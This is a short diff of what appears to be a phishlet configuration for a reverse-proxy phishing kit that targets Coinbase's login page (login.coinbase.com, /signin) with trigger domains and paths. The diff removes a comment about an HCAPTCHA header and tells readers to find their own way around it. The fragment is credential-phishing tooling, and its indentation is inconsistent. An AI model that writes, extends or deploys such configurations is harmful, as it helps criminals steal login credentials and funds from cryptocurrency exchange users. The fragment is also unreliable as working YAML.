@@ -60,9 +60,6 @@ login:
   domain: 'login.coinbase.com'
   path: '/signin?login_challenge='
 
-  
-# HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
-
       - trigger_domains: ["login.coinbase.com/signin?"]
    trigger_paths: ["/signin","/signin*"]
        trigger_params: []
